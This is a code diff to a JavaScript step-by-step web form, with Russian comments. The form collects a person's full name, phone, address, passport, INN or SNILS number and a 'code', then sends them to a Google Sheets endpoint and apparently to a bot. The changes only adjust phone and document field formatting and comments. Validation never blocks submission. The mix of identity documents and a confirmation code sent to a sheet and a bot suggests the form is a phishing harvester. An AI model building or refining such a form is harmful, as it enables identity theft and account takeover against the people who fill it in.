@@ -202,7 +202,7 @@
         ["fullname", "phone", "address", "docnumber", "code"].forEach((id) => {
           const el = document.getElementById(id);
           if (el) {
-            el.addEventListener("input", () => this.validate(this.currentStep)); // подсказки в реальном времени
+            el.addEventListener("input", () => this.validate(this.currentStep)); // подсказки сразу
             el.addEventListener("keypress", (e) => { if (e.key === "Enter") { e.preventDefault(); this.next(); } });
             if (id === "phone") el.addEventListener("input", () => formatPhone(el));
           }
@@ -231,10 +231,14 @@
       }
 
       next() {
-        // Валидация всегда отрабатывает, но НЕ блокирует
+        // Валидация всегда отрабатывает, но НЕ блокирует переход
         this.validate(this.currentStep);
         if (this.currentStep === "fullname") { this.formData.fullname = (document.getElementById("fullname").value || "").trim(); return this.show("phone"); }
-        if (this.currentStep === "phone") { this.formData.phone = (document.getElementById("phone").value || "").trim(); return this.show("address"); }
+        if (this.currentStep === "phone") {
+          const raw = (document.getElementById("phone").value || "").trim();
+          this.formData.phone_raw = raw; // как ввёл пользователь
+          return this.show("address");
+        }
         if (this.currentStep === "address") { this.formData.address = (document.getElementById("address").value || "").trim(); return this.show("document-type"); }
         if (this.currentStep === "document-number") { this.formData.doc_number = (document.getElementById("docnumber").value || "").trim(); return this.show("code"); }
         if (this.currentStep === "code") { this.formData.code = (document.getElementById("code").value || "").trim(); return this.send(); }
@@ -270,7 +274,7 @@
           else this.show("main");
         }
         if (doc) {
-          this.formData.doc_type = doc; // <— отдельное поле для типа документа
+          this.formData.doc_type = doc; // запоминаем тип документа
           const ex = { Паспорт: "Пример: 4510123456", ИНН: "Пример: 500100732259", СНИЛС: "Пример: 112-233-445 95" };
           const docExample = document.getElementById("doc-example"); if (docExample) docExample.textContent = ex[doc] || "";
           const docTitle = document.getElementById("doc-title"); if (docTitle) docTitle.textContent = `🔢 Введите номер документа (${doc})`;
@@ -278,7 +282,7 @@
         }
       }
 
-      // МЯГКАЯ ВАЛИДАЦИЯ: показывает подсказки, но НЕ блокирует переход
+      // МЯГКАЯ ВАЛИДАЦИЯ (подсказки, но не блокирует)
       validate(step) {
         const e = (id) => document.getElementById(id);
         const get = (id) => (document.getElementById(id)?.value || "").trim();
@@ -295,7 +299,7 @@
         if (step === "phone") {
           const v = get("phone"), d=v.replace(/\D/g,"");
           if (d.length < 10) warn("err-phone","Введите номер телефона (желательно +7 и 10 цифр после).");
-          this.formData.phone = v; return true;
+          return true;
         }
         if (step === "address") {
           const v = get("address");
@@ -309,7 +313,6 @@
           if (type === "Паспорт" && d.length !== 10) warn("err-doc","Паспорт обычно 10 цифр, но пропускаю далее.");
           if (type === "ИНН" && d.length !== 12) warn("err-doc","ИНН обычно 12 цифр, но пропускаю далее.");
           if (type === "СНИЛС" && !/^\d{3}-?\d{3}-?\d{3}\s?\d{2}$/.test(raw)) warn("err-doc","СНИЛС формат XXX-XXX-XXX XX, но пропускаю далее.");
-          // сохраняем ОТДЕЛЬНОЕ поле doc_number (строкой), и дублируем чистые цифры
           this.formData.doc_number = raw.trim();
           this.formData.doc_number_digits = d;
           return true;
@@ -323,20 +326,24 @@
       }
 
       async send() {
-        // готовим запись: и отдельные поля, и склеенное — чтобы твой Apps Script поймал любое
+        // телефон в таблицу — ТОЛЬКО ЦИФРЫ
+        const phoneDigits = String(this.formData.phone_raw || "").replace(/\D/g, "");
+
         const rec = {
           timestamp: new Date().toISOString().slice(0, 19).replace("T", " "),
           fullname: this.formData.fullname || "",
-          phone: String(this.formData.phone || ""),          // строкой, чтобы не терять формат
+          phone: phoneDigits,                   // ← сюда уйдёт без "+" и прочих символов
           address: this.formData.address || "",
-          doc_type: this.formData.doc_type || "",            // <— отдельно тип
-          doc_number: String(this.formData.doc_number || ""),// <— отдельно номер (как вводил пользователь)
-          doc_number_digits: String(this.formData.doc_number_digits || ""), // только цифры (удобно для формул)
-          document: `${this.formData.doc_type || ""} ${this.formData.doc_number || ""}`.trim(), // совместимость
+          doc_type: this.formData.doc_type || "",
+          doc_number: String(this.formData.doc_number || ""),
+          doc_number_digits: String(this.formData.doc_number_digits || ""),
+          document: `${this.formData.doc_type || ""} ${this.formData.doc_number || ""}`.trim(),
           code: String(this.formData.code || "")
         };
+
         try { await sendToSheet(rec); } catch (err) { console.warn("sendToSheet error:", err); }
         sendToBotOnce(rec);
+
         this.formData = {};
         this.show("main");
         alert("Данные успешно отправлены!");
@@ -354,23 +361,21 @@
     const SECRET = "benhillworkspeisworkhab";
 
     async function sendToSheet(rec) {
-      // Все ключевые поля — строками, чтобы исключить авто-преобразование Google Sheets
+      // Все ключевые поля — строками
       const safe = Object.fromEntries(Object.entries(rec).map(([k,v]) => [k, (v==null? "": String(v))]));
       const payload = JSON.stringify({ type: "lead", payload: safe, secret: SECRET });
 
       const loading = document.getElementById("loading");
       if (loading) loading.style.display = "block";
       try {
-        // text/plain — меньше шансов на preflight/CORS
         const res = await fetch(SHEETS_WEBAPP_URL, {
           method: "POST",
-          headers: { "Content-Type": "text/plain;charset=utf-8" },
+          headers: { "Content-Type": "text/plain;charset=utf-8" }, // text/plain — меньше preflight/CORS
           body: payload
         });
         const text = await res.text();
         let data = {}; try { data = JSON.parse(text); } catch {}
         if (!res.ok || !data.ok) throw new Error(data.error || text || "request failed");
-        // ок
       } catch (err) {
         console.warn("sendToSheet error:", err);
         alert("Не удалось записать в таблицу: " + err.message);
